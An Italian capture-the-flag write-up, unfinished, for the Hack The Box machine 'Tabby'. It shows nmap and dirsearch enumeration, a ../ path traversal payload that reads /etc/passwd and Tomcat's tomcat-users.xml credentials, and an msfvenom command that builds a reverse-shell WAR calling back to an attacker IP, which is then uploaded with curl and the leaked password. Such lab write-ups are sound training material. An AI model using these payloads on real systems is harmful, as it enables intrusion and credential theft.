# Tabby (NON COMPLETATA!)

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.194
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.194
Host is up (0.042s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/15%OT=22%CT=1%CU=37832%PV=Y%DS=2%DC=I%G=Y%TM=655484
OS:3D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Porta 80

Visito la pagina http://10.10.10.194/:

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-1.png"/>
</p>

Aggiungo quindi _megahosting.htb_ al file _/etc/hosts_.

Provo ad utilizzare il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.194/
```

```text
[03:53:06] 403 -  277B  - /.ht_wsr.txt
[03:53:06] 403 -  277B  - /.htaccess.orig
[03:53:06] 403 -  277B  - /.htaccess.bak1
[03:53:06] 403 -  277B  - /.htaccess.sample
[03:53:06] 403 -  277B  - /.htaccess.save
[03:53:06] 403 -  277B  - /.htaccess_extra
[03:53:06] 403 -  277B  - /.htaccessOLD
[03:53:06] 403 -  277B  - /.htaccess_orig
[03:53:06] 403 -  277B  - /.htaccessBAK
[03:53:06] 403 -  277B  - /.htaccessOLD2
[03:53:06] 403 -  277B  - /.htaccess_sc
[03:53:06] 403 -  277B  - /.htm
[03:53:06] 403 -  277B  - /.html
[03:53:06] 403 -  277B  - /.httr-oauth
[03:53:06] 403 -  277B  - /.htpasswds
[03:53:06] 403 -  277B  - /.htpasswd_test
[03:53:08] 403 -  277B  - /.php
[03:53:27] 403 -  277B  - /assets/
[03:53:27] 301 -  313B  - /assets  ->  http://10.10.10.194/assets/
[03:53:42] 200 -  766B  - /favicon.ico
[03:53:43] 301 -  312B  - /files  ->  http://10.10.10.194/files/
[03:53:43] 403 -  277B  - /files/
[03:53:59] 200 -    0B  - /news.php
[03:54:09] 200 -  811B  - /Readme.txt
[03:54:13] 403 -  277B  - /server-status
[03:54:13] 403 -  277B  - /server-status/
```

Di seguito il contenuto della pagina http://10.10.10.194/Readme.txt:

```text
== Theme Name: Hosting One Page Template
== Copyright (c) 2016 BootstrapThemes.co
== http://BootstrapThemes.co

Html Created by: http://bootstrapthemes.co

Psd Created by: Kristaps Elsins- https://dribbble.com/shots/1520333-Free-Hosting-Template-PSD

Rights:
You are permitted to use the resources for any number of personal and commercial projects.
You may modify the resources according to your requirements and include them into works,
such as websites, applications or other materials intended for sale. No attribution or
link back to this site is required, however any credit will be much appreciated.

Prohibitions:
You do not have the rights to redistribute, resell, lease, license, sublicense or offer
files downloaded from http://bootstrapthemes.co to any third party ìas isî or as a separate attachment
from any of your work. If you wish to promote my resources on your site, you must link back
to the resource page where users can find the download and not directly to the download file.

If you would like to share one of my resources, you can do so by making a link to the specific
resource on http://bootstrapthemes.co , you can if you wish insert the embed code for the product previews images to illustrate your link.
No HOTLINKING is allowed i.e. you cannot make a direct link to the download or/and the images hosted on http://bootstrapthemes.co

Concerning blog posts, you are free to link to it from any website,
but you cannot however publish it as it is, without prior consent from http://bootstrapthemes.co
```

Questo invece è il contenuto della pagina http://10.10.10.194/news.php:

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-3.png"/>
</p>

Mi risalta subito all'occhio l'url aggiornato della pagina: http://megahosting.htb/news.php?file=statement.

Quindi provo a verificare la presenza della vulnerabilità LFI (Local Fil Inclusion) utilizzando come paramentro la seguente stringa: ../../../../../etc/passwd. Il risultato è il seguente:

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-6.png"/>
</p>

**Quindi è vulnerabile!**

### Porta 8080

Visito la pagina http://10.10.10.194:8080/:

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-2.png"/>
</p>

Provo a cliccare su _manager webapp_ e ottengo questo form:

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-4.png"/>
</p>

Provo a sfruttare la vulnerabilità precedentemente trovata per accedere al file /etc/tomcat9/tomcat-users.xml. Purtroppo non ottengo nulla.

Dopo vari tentativi, provo ad effettuare la seguente richiesta: http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml.

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-7.png"/>
</p>

**Ottengo quindi delle credenziali!**


## Exploitation

Provo ad accedere tramite il form ma ottengo il seguente risultato:

<p align="center">
  <img src="/Immagini/Linux-Box/Tabby/tabby-8.png"/>
</p>

Quindi provo un'altra strada. Genero un file war, per creare una reverse shell, attraverso l'utilizzo del seguente comando:

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=9999 -f war > naclapor.war
```

Successivamente, carico il file sulla tomcat manager interface:

```text
curl -u "tomcat:\$3cureP4s5w0rd123!" --upload-file naclapor.war http://10.10.10.194:8080/manager/text/deploy?path=/naclapor
```

NON VA!

...

## Privilege Escalation

...


## Credits

...
